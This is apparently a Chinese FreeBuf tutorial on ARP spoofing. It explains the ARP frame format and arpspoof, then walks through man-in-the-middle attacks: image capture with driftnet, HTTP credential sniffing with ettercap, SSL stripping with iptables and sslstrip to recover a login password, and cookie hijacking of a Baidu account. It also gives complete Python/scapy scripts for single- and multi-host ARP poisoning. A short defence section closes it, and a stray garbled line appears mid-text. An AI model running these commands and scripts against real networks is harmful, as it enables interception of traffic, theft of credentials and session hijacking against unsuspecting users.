**严正声明：本文提供的程序或者方法可能带有攻击性，仅供安全研究与教学之用，如将其信息做其他用途，由读者自己承担全部法律及连带责任，作者不承担任何法律及连带责任。**

## 0x00 前言

**ARP欺骗是一个老生常谈的话题，翻看各位师傅的文章，大多数都是在使用arpspoof(当然，同样看到过使用Python写一款类似的工具的文章)进行单机欺骗。本文的目的在于总结ARP欺骗原理、常见姿势以及实现多机ARP欺骗。**

## 0x01 ARP帧格式

DST | SRC | 长度或类型 | 硬件类型 | 协议类型 | 硬件大小 | 协议大小 | Op | 发送方的硬件地址(MAC地址) |
发送方的协议地址(IPv4) | 目的硬件地址(MAC地址) | 目的协议地址(IPv4) | 填充(不按比例) | FCS  
---|---|---|---|---|---|---|---|---|---|---|---|---|---  
6 | 6 | 2 | 2 | 2 | 1 | 1 | 2 | 6 | 4 | 6 | 4 | 18 | 4  
  
DST、SRC、长度或类型。

> 这三个字段是以太网头部

DST(6):目的以太网地址。当该帧为ARP请求时，DST为ff:ff:ff:ff:ff:ff(即6个字节全部为1)。

SRC(6):源以太网地址。

长度或类型(2):对于ARP帧来说，该字段固定，0x0806。

硬件类型、协议类型、硬件大小、协议大小、Op、发送方的硬件地址(MAC地址)、发送方的协议地址(IPv4)、目的硬件地址(MAC地址)、目的协议地址(IPv4)

> ARP请求或应答，针对IPv4地址映射到MAC地址

硬件类型、协议类型、硬件大小、协议大小(决定了最后4个字段的类型和大小，硬件大小与协议大小的单位均为Byte):
对于以太网和IPv4来说，这4个字段分别是1、0x0800、6、4。

Op:指出该帧的类型。ARP请求(值为1)、ARP应答(值为2)、RARP请求(值为3)、RARP应答(值为4)。

发送方的硬件地址(MAC地址)、发送方的协议地址(IPv4)、目的硬件地址(MAC地址)、目的协议地址(IPv4):这4个字段无须解释。需要注意的是，ARP请求帧中目的硬件地址全为0。

进入Python3解释器环境，输入下面的命令来查看一下ARP帧格式：

    
    
    >>> from scapy.all import *
    >>> ls(ARP)
    

输出信息如下：

    
    
    hwtype     : XShortField                         = (1)
    ptype      : XShortEnumField                     = (2048)
    hwlen      : FieldLenField                       = (None)
    plen       : FieldLenField                       = (None)
    op         : ShortEnumField                      = (1)
    hwsrc      : MultipleTypeField                   = (None)
    psrc       : MultipleTypeField                   = (None)
    hwdst      : MultipleTypeField                   = (None)
    pdst       : MultipleTypeField                   = (None)
    

Wireshark抓包，过滤规则arp.opcode==1即ARP请求帧：

![arp_request\(马赛克\).png](https://image.3001.net/images/20190710/1562727492_5d255444f1941.png!small)

过滤规则arp.opcode==2即ARP应答帧：

![arp_reply\(马赛克\).png](https://image.3001.net/images/20190710/1562727526_5d255466f29da.png!small)

## 0x02 ARP欺骗原理

> 一开始使用“手绘”，可是图片委实太丑，于是放弃。谢谢年华师傅推荐的在线作图网站。

正常情况下的ARP请求与应答：

![ARP_normal.png](https://image.3001.net/images/20190710/1562727684_5d255504bf6c5.png!small)

> PC2广播ARP请求，询问IP地址为192.168.3.2的主机的MAC地址。
> PC1收到广播帧，发出ARP应答，告诉PC2自己是192.168.3.2，MAC地址是aa:aa:aa:aa:aa:aa。

单向ARP欺骗：

· 1 12232132332

1 12232132332

1 12232132332

1 12232132332

![ARP_Attack\(单向\).png](https://image.3001.net/images/20190710/1562727837_5d25559d28d3e.png!small)

> PC1广播ARP请求，询问IP地址为192.168.3.1的主机的MAC地址。
> PC3收到广播帧，发出ARP应答，告诉PC1自己是192.168.3.1，MAC地址是cc:cc:cc:cc:cc:cc。（这之后，PC1发给PC2的所有流量都会发给PC3）

双向ARP欺骗：

纸不够大，就没有画图，可以参照上面单向ARP欺骗的图。。。

> PC1广播ARP请求，询问IP地址为192.168.3.1的主机的MAC地址。
> PC3收到PC1的广播帧，发出ARP应答，告诉PC1自己是192.168.3.1，MAC地址是cc:cc:cc:cc:cc:cc。（这之后，PC1发给PC2的所有流量都会发给PC3）
> PC2广播ARP请求，询问IP地址为192.168.3.2的主机的MAC地址。
> PC3收到PC2的广播帧，发出ARP应答，告诉PC1自己是192.168.3.2，MAC地址是cc:cc:cc:cc:cc:cc。（这之后，PC2发给PC1的所有流量都会发给PC3）

## 0x03 arpspoof浅析

笔者电脑的系统是Ubuntu 16.04，需要先安装dsniff(arpspoof是dsniff的一个组件)：

    
    
    sudo apt install dsniff
    

查看一下arpspoof的参数：

    
    
    Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
    

i参数：用来指定网卡名称，可以使用ifconfig命令来查看网卡名称。

c参数：用来恢复受害者主机的ARP缓存表。详情见下文。

t参数：用来指定目标主机即受害者IP。

host：将要伪装的主机IP。

r参数：使用该选项代表双向欺骗。

### 3.1 使用arpspoof进行欺骗

起初使用某为的无线路由器进行测试，发现无论是使用arpspoof还是自己编写的脚本都无效，让我有种怀疑“人生”的感觉；之后使用某Link的无线路由器再次测试，成功。这里不得不称赞一下某为的无线路由器。

> 下面图片的打码可能会影响阅读，所以提前说明三台主机的MAC地址：
>
> attacker：C4:XX:XX:XX:XX:D9
>
> 网关：B8:XX:XX:XX:XX:59
>
> 受害者：F0:XX:XX:XX:XX:D3

本机即attacker的IP及MAC地址：

![attacker_ip.png](https://image.3001.net/images/20190710/1562727864_5d2555b8b4b5d.png!small)

测试的网络环境中存活主机：

![网络环境.png](https://image.3001.net/images/20190710/1562727910_5d2555e633345.png!small)

其中IP地址为192.168.0.1的主机是网关即无线路由器，IP地址为192.168.0.110的主机是受害者。先来进行单向欺骗（root环境下）：

    
    
    arpspoof -i wlo1 -t 192.168.0.110 192.168.0.1
    

没有欺骗之前受害者的ARP缓存表：

![未欺骗.png](https://image.3001.net/images/20190710/1562728031_5d25565f78e8a.png!small)

单向欺骗之后受害者的ARP缓存表：

![欺骗后.png](https://image.3001.net/images/20190710/1562728042_5d25566aa7ace.png!small)

进行双向欺骗，可以从attacker发送帧的情况中看出。单向欺骗时：

![单向欺骗.png](https://image.3001.net/images/20190710/1562728061_5d25567d0c311.png!small)

这时attacker只“告诉”192.168.0.110自己是192.168.0.1。双向欺骗时：

    
    
     arpspoof -i wlo1 -t 192.168.0.110 -r 192.168.0.1
    

![双向欺骗.png](https://image.3001.net/images/20190710/1562728098_5d2556a2dd5ca.png!small)

这时attacker不仅“告诉”192.168.0.110自己是192.168.0.1，同时“告诉”192.168.0.1自己是192.168.0.110。

### 3.2 arpspoof的-c参数

经过一番“艰难”的研究之后，终于大致地搞明白了这个参数的作用。源码没有细看（主要是看不懂），如有错误，还望指正。

    
    
    arpspoof -i wlo1 -c own -t 192.168.0.110 192.168.0.1
    

如果`-c`参数为`own`，在退出时使用本机MAC地址作为以太网头部的SRC发送给受害者主机以恢复其ARP缓存表，即告诉受害者主机正确的网关MAC地址。

![c_own_0.png](https://image.3001.net/images/20190710/1562728125_5d2556bd7c7eb.png!small)

从抓到的数据包中也可以看出：

![c_own_3.png](https://image.3001.net/images/20190710/1562728178_5d2556f28f5ba.png!small)

上面这个数据包是在使用arpspoof进行ARP欺骗时抓到的，以太网头部的SRC是attacker的MAC地址，ARP帧中发送方的MAC地址也是attacker的MAC地址。

![c_own_1.png](https://image.3001.net/images/20190710/1562728188_5d2556fc6cd8c.png!small)

这个包是在`Cleaning up and re-arping
targets...`时抓到的，注意这时以太网头部的SRC是attacker的MAC地址，而ARP帧中发送方的MAC地址已经变为网关的MAC地址了，而不再是attacker的MAC地址。

    
    
    arpspoof -i wlo1 -c host -t 192.168.0.110 192.168.0.1
    

如果`-c`参数为`host`，在退出时使用网关MAC地址作为以太网头部的SRC发送给受害者主机以恢复其ARP缓存表。

![c_host_0.png](https://image.3001.net/images/20190710/1562728217_5d255719ae24d.png!small)

![c_host_1.png](https://image.3001.net/images/20190710/1562728242_5d2557324d54d.png!small)

将上面这个包与`-c`参数为`own`时抓到的包对比来看，可以看出该包中以太网头部的SRC与ARP帧中发送方MAC地址一致，都是网关的MAC地址。

`-c`参数为`own`或者为`host`时，都是发送5次数据包：

![c_own_2.png](https://image.3001.net/images/20190710/1562728259_5d255743daf39.png!small)

![c_host_2.png](https://image.3001.net/images/20190710/1562728265_5d2557497ed9c.png!small)

而`-c`参数为`both`时，会发送10次数据包（`own`和`host`各5次）。

这个可以从源码中一探究竟：

    
    
        if (!cleanup_src || strcmp(cleanup_src, "own")==0) { /* default! */
        cleanup_src_own = 1;
        cleanup_src_host = 0;
        } else if (strcmp(cleanup_src, "host")==0) {
        cleanup_src_own = 0;
        cleanup_src_host = 1;
        } else if (strcmp(cleanup_src, "both")==0) {
        cleanup_src_own = 1;
        cleanup_src_host = 1;
        } else {
        errx(1, "Invalid parameter to -c: use 'own' (default), 'host' or 'both'.");
        usage();
        }
    

当选择`own`（没有这一参数即默认选择`own`）时，`cleanup_src_own = 1`；当选择`host`时，`cleanup_src_host
= 1`；当选择`both`时，两者均为1 ；而其他的选项则会显示出错信息。

    
    
        cleanup(int sig)
        {
            int fw = arp_find(spoof.ip, &spoof.mac);
            int bw = poison_reverse && targets[0].ip && arp_find_all();
            int i;
            int rounds = (cleanup_src_own*5 + cleanup_src_host*5);
            fprintf(stderr, "Cleaning up and re-arping targets...\n");
            for (i = 0; i < rounds; i++) {
                struct host *target = targets;
                while(target->ip) {
                    uint8_t *src_ha = NULL;
                    if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
                        src_ha = my_ha;
                    }
                    if (fw) {
                        arp_send(l, ARPOP_REPLY,
                             (u_int8_t *)&spoof.mac, spoof.ip,
                             (target->ip ? (u_int8_t *)&target->mac : brd_ha),
                             target->ip,
                             src_ha);
                        sleep(1);
                    }
                    if (bw) {
                        arp_send(l, ARPOP_REPLY,
                             (u_int8_t *)&target->mac, target->ip,
                             (u_int8_t *)&spoof.mac,
                             spoof.ip,
                             src_ha);
                        sleep(1);
                    }
                    target++;
                }
            }
            exit(0);
        }
    

上述的 `cleanup_src_own`与`cleanup_src_host`的取值决定了该函数中`int rounds =
(cleanup_src_own*5 +
cleanup_src_host*5)`的计算结果，进而决定下面的`for`循环次数即发送数据包的次数。但是为什么要选择5次，这个就不得而知了。。。

## 0x04 常见利用姿势

### 4.1 （First）开启路由转发

上述的单向或者双向欺骗都只能造成受害者主机断网（可以见下图），若断网引起对方警觉，这样就“尴尬”了。

![ping百度.png](https://image.3001.net/images/20190710/1562728283_5d25575b85fa6.png!small)

> 第一个PING命令是我在实施双向欺骗之后进行的，第二个PING命令是在正常情况下进行的。

所以，需要在attacker主机上开启路由转发功能，这样双方的流量都可以正常通过，而不是遭遇“堵塞”。

    
    
    echo 1 > /proc/sys/net/ipv4/ip_forward
    

0代表没有开启，1代表开启
。永久开启的方法可以参考这篇[文章](http://blog.chinaunix.net/uid-14691740-id-3055343.html)
。如果不觉得麻烦的话，也可以去相应路径下找到文件然后修改。。。

![路由转发.png](https://image.3001.net/images/20190710/1562728297_5d25576925c85.png!small)

### 4.2 driftnet获取图片记录

在开启了路由转发的前提下，使用arpspoof进行 **双向欺骗** ：

    
    
     arpspoof -i wlo1 -t 192.168.0.110 -r 192.168.0.1
    

之后打开另一终端（root权限下）使用`driftnet`或者`driftnet -i
wlo1`命令（不使用`-i`参数指定interface的话默认是全部interface）获取图片记录（如果没有安装的话，`apt install
driftnet`安装即可）：

![driftnet_1.png](https://image.3001.net/images/20190710/1562728313_5d2557790d488.png!small)

![driftnet.png](https://image.3001.net/images/20190710/1562728332_5d25578c302e5.png!small)

前者是我在受害者主机上搜索“超级马里奥”，后者是driftnet获取到的图片。

driftnet的help信息中有这样一句话：

![driftnet_help.png](https://image.3001.net/images/20190710/1562728344_5d255798bb29d.png!small)

当你在单击driftnet窗口中的某张图片时，会保存到当前目录：

![driftnet_save.png](https://image.3001.net/images/20190710/1562728354_5d2557a220256.png!small)

从命名方式可以看出来，我单击了7张图片，Home目录下就保存了7张图片。

涉及到保存图片的参数有4个：

-a：Adjunct mode（附加模式）。不在窗口中显示图片，而是保存到一个临时目录下，并在终端输出其路径。

-m number：Adjunct mode下，在临时目录中最多保存的图片数量（但似乎并没有什么卵用）。 -d directory：指定保存的临时目录名。指定时该目录是已经存在的，否则会报错（可以见下面第3张图片）；如果不指定，目录名会随机生成。 -x prefix：指定保存图片的前缀，与`-a`参数同时使用时该参数无效。 

![006aC3LYly1g4lutleh65j30k608et98.jpg](https://image.3001.net/images/20190710/1562728510_5d25583e2b2ed.jpg!small)

上图中`drifnet-xxxxxx`目录就是保存图片的临时目录。在使用`-a`参数时，如果出现如下错误提示：

![rm_pid.png](https://image.3001.net/images/20190710/1562728565_5d2558758ecd5.png!small)

使用`rm /tmp/driftnet.pid`命令将`/tmp/driftnet.pid`删除即可。

![driftnet_a_m.png](https://image.3001.net/images/20190710/1562728585_5d2558894e02c.png!small)

从上图可以看到`-d`参数指定目录不存在时给出的错误信息，而`-x`参数与`-a`参数同时使用被忽略了。下图是使用`driftnet -x
ddd`命令`-x`参数起作用时的效果：

![driftnet_x.png](https://image.3001.net/images/20190710/1562728591_5d25588fe4d9e.png!small)

### 4.3 ettercap嗅探HTTP网站帐号密码

> ettercap是个“神器”，本文重点不在于此，故不去详细介绍。

开启路由转发、arpspoof双向欺骗不多赘述，一切就绪之后，另一终端下使用如下命令：

    
    
     ettercap -Tq -i wlo1
    

`T`代表命令行界面而非GUI显示，`q`代表不显示数据包内容，`i`指定监听网卡。

![ettercap.png](https://image.3001.net/images/20190710/1562728607_5d25589f460e0.png!small)

### 4.4 sslstrip+dns2proxy_hsts嗅探HTTPS网站帐号密码

先把工具的链接奉上：

sslstrip：Kali下自带；如果是其他Linux版本，使用`sudo apt install sslstrip`命令安装即可。

[sslstrip2](https://github.com/byt3bl33d3r/sslstrip2)
：作者因为某些原因删掉了原来的代码，这是我在另一处找到的。（你也可以选择使用sslstrip）

[dns2proxy_hsts](https://github.com/LeonardoNve/dns2proxy_hsts)

嗅探HTTPS网站的帐号密码的思想就是将HTTPS降成HTTP，之后再嗅探HTTP网站的帐号密码。

首先，在attacker本机上进行端口映射（有关iptables的知识可以参考这篇[文章](http://www.zsythink.net/archives/1764)
，本文重点不在于iptables）：

    
    
     iptables --flush
     iptables --flush -t nat
     iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
     iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
    

前2条命令是在做清理工作，后2条命令才是进行端口映射。之后到dns2proxy_hsts目录下，执行（如果它依赖的dns库没有安装的话，使用`sudo
pip install dnspython`安装即可）：

    
    
    python2 dns2proxy.py
    

Then，打开另一终端：

    
    
    sslstrip -l 8888 -a
    

准备工作就绪后，使用arpspoof进行双向欺骗。

最后，使用tail命令持续刷新显示sslstrip.log文件的新内容：

    
    
    tail -f sslstrip.log
    

下面是一组图片，有图有真相。

![1905_1.png](https://image.3001.net/images/20190710/1562728631_5d2558b777514.png!small)

这是某网站的登录入口。正常打开该网站的登录界面时：

![1905_0.png](https://image.3001.net/images/20190710/1562728688_5d2558f03f7e5.png!small)

执行完上面的操作后，再次打开该页面：

![1905.png](https://image.3001.net/images/20190710/1562728702_5d2558fe6586d.png!small)

可以看到“小锁”标志已经变成了“不安全”，这一点通常没有人去注意，而且该网站的首页在打开时就有一个“不安全”的标志，所以为其提供了更好的隐蔽性。我输入之前为了测试注册的帐号与密码，登录成功：

![1905_2.png](https://image.3001.net/images/20190710/1562728711_5d255907814da.png!small)

现在来看看attacker电脑上嗅探到的密码：

![1905_3.png](https://image.3001.net/images/20190710/1562728721_5d2559113a60a.png!small)

帐号明文传输，密码经过前端加密后传输，后面的seccode是URL编码后传输的验证码，_=后面的一串数字含义不明但每次都不变。

嗅探到帐号和密码，目的已经达到，虽然密码经过了前端加密而不是明文传输。。。

但是不获取到它的明文内容怎能罢休？？

仔细瞅了瞅这个网站，发现了这个东东：

![1905_5.png](https://image.3001.net/images/20190710/1562728729_5d255919f1e13.png!small)

MD5加密无疑了，解密即可（不会JS，所以没看`md5.min.js`这个文件）:

![1905_4.png](https://image.3001.net/images/20190710/1562728734_5d25591e64a30.png!small)

密码与之前登录时输入的密码一致。

### 4.5 WIreshark+Cookie Hacker劫持Cookie

谢谢余弦师傅的[Cookie Hacker](https://github.com/evilcos/cookiehacker) 。

受害者主机上打开百度贴吧，并登录：

![tieba_0.png](https://image.3001.net/images/20190710/1562728798_5d25595e1fc70.png!small)

arpspoof双向欺骗就不用再强调了，之后打开WIreshark，过滤规则`http.cookie`，可以看到好多，点开其中的一个：

![tieba_3.png](https://image.3001.net/images/20190710/1562728812_5d25596c1440f.png!small)

复制Cookie为纯文本，到Cookie Hacker中：

![tieba_4.png](https://image.3001.net/images/20190710/1562728825_5d2559794ce8f.png!small)

在点击`Inject Cookies`之前，我的百度贴吧是未登录状态：

![tieba_1.png](https://image.3001.net/images/20190710/1562728834_5d2559828f8dd.png!small)

点击`Inject Cookies`之后，并刷新页面，登录成功：

![tieba_0.png](https://image.3001.net/images/20190710/1562728841_5d2559895ed85.png!small)

用该Cookie登录百度官网也是可以的：

![tieba_2.png](https://image.3001.net/images/20190710/1562728852_5d2559949df85.png!small)

## 0x05 使用Python编写一款类似arpspoof的工具

    
    
    #!/usr/bin/python
    
    from scapy.all import *
    import argparse
    
    def main(interface,t1_ip,t2_ip):
        local_mac=get_if_hwaddr(interface) #本机MAC地址
        t1_mac=getmacbyip(t1_ip) #Target1MAC地址
        t2_mac=getmacbyip(t2_ip) #Target2MAC地址
    
        t1_packet=Ether(src=local_mac,dst=t1_mac)/\
                ARP(hwsrc=local_mac,psrc=t2_ip,hwdst=t1_mac,pdst=t1_ip,op=2)
               #构造ARP帧，告诉Target1:Target2的MAC地址是本机MAC
        t2_packet=Ether(src=local_mac,dst=t2_mac)/\
                ARP(hwsrc=local_mac,psrc=t1_ip,hwdst=t2_mac,pdst=t2_ip,op=2)
               #构造ARP帧，告诉Target2:Target1的MAC地址是本机MAC
        while True:
            sendp(t1_packet,iface=interface,inter=1)
            print("Telling \033[1;33m%s\033[0m \033[1;36m%s\033[0m is at %s"%(t1_ip,t2_ip,local_mac))
    
            sendp(t2_packet,iface=interface,inter=1)
            print("Telling \033[1;33m%s\033[0m \033[1;36m%s\033[0m is at %s"%(t2_ip,t1_ip,local_mac))
    
    if __name__ == '__main__':
        parser=argparse.ArgumentParser()
        parser.add_argument('-i',help='Interface')
        parser.add_argument('-t',help='Target1 ip')
        parser.add_argument('-g',help='Target2 ip')
        args=parser.parse_args()
        if args.i and args.t and args.g:
            main(args.i,args.t,args.g)
        else:
            print("\033[1;31mPlease enter the correct parameters.\033[0m")
    

效果图：

![script_0.png](https://image.3001.net/images/20190710/1562728894_5d2559bec7422.png!small)

## 0x06 使用Python编写脚本进行多机欺骗

    
    
    #!/usr/bin/python
    
    from scapy.all import *
    import argparse
    import threading
    from queue import Queue
    
    interface=''
    t2_ip=''
    target_queue=Queue()
    
    class MyThread(threading.Thread):
        def __init__(self,func,args):
            threading.Thread.__init__(self)
            self.func=func
            self.args=args
        def run(self):
            self.func(self.args)
    
    def main(t1_ip):
        global interface
        global t2_ip
        local_mac=get_if_hwaddr(interface)
        t2_mac=getmacbyip(t2_ip)
        while not target_queue.empty():
            t1_ip=target_queue.get(True,3)
            t1_mac=getmacbyip(t1_ip)
            t1_packet=Ether(src=local_mac,dst=t1_mac)/\
                ARP(hwsrc=local_mac,psrc=t2_ip,hwdst=t1_mac,pdst=t1_ip,op=2)
            t2_packet=Ether(src=local_mac,dst=t2_mac)/\
               ARP(hwsrc=local_mac,psrc=t1_ip,hwdst=t2_mac,pdst=t2_ip,op=2)
            while True:
                sendp(t1_packet,iface=interface,inter=1)
                print("Telling \033[1;33m%s\033[0m \033[1;36m%s\033[0m is at %s"%(t1_ip,t2_ip,local_mac))
                sendp(t2_packet,iface=interface,inter=1)
                print("Telling \033[1;33m%s\033[0m \033[1;36m%s\033[0m is at %s"%(t2_ip,t1_ip,local_mac))
    
    def list_process(list_file):
        with open(list_file) as f:
            for ip in f.readlines():
                target_queue.put(ip)
    
    if __name__ == '__main__':
        parser=argparse.ArgumentParser()
        parser.add_argument('-i',help='Interface')
        parser.add_argument('-l',help='Target1_ip list')
        parser.add_argument('-g',help='Target2 ip')
        args=parser.parse_args()
        if args.i and args.l and args.g:
            target_threads=[]
            interface=args.i
            t2_ip=args.g
            list_process(args.l)
            for i in range(10):
                t=MyThread(main,target_queue)
                target_threads.append(t)
            for i in range(10):
                target_threads[i].start()
            for i in range(10):
                target_threads[i].join()
        else:
            print("\033[1;31mPlease enter the correct parameters.\033[0m")
    

`-l`后面跟的是目标IP列表文件的名称，such as：`python2 arp_attack_thread.py -l 1.txt -g
192.168.0.1 -i wlo1`。

效果图：

![arp_script\(thread\).png](https://image.3001.net/images/20190710/1562728910_5d2559ce8d632.png!small)

如果欺骗主机数量过多，而本机性能有些吃力的话，就变成了DDoS。

## 0x07 ARP欺骗常见防御方法及溯源

在清楚了ARP欺骗的原理之后，防御手段主要从两个方面出发：

阻断伪造数据包的传播

受害者不接受伪造数据包

### 7.1 阻断伪造数据包的传播

该方法主要是从交换机或者路由器等网络设备的角度出发。

以交换机为例，将交换机的端口、MAC地址、IP地址三者绑定，生成DAI(Dynamic ARP
Inspection)检测表。如果某个端口的主机发送了与它在DAI表中的条目不相符的数据包，可以选择令其断网或者丢弃其发送的数据包。

### 7.2 受害者不接受伪造数据包

该方法主要是从用户的角度出发。

首先，不要随便接入陌生的网络是一定的。其次，用户可以在设备上安装ARP防火墙。如果是技术人员，可以选择建立静态ARP条目（适用于不会经常变动且数量较少的网络环境），Windonws用户使用命令`arp
-s ip地址 mac地址`来进行静态绑定。

### 7.3 溯源

被攻击了要找到源头，总不能不明不白地“死”掉。

还是以交换机为例。查看被欺骗主机的ARP缓存表，查看网关IP的MAC地址，之后到交换机上去查看对应该MAC的端口，就可以找到对应的“幕后黑手”了。

## 0x08 参考文章及延伸

> [如何揪出“内鬼”并“优雅的还手”](https://www.cnblogs.com/csguo/p/7527582.html)
>
>
> [https://zh.wikipedia.org/wiki/ARP%E6%AC%BA%E9%A8%99（里面提到了ARP的正当用途）](https://zh.wikipedia.org/wiki/ARP%E6%AC%BA%E9%A8%259)
>
> [企业ARP欺骗分析及防御：不同网段欺骗分析及对策](http://www.bingdun.com/news/security/9591.htm)

 ***本文作者：ERFZE，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

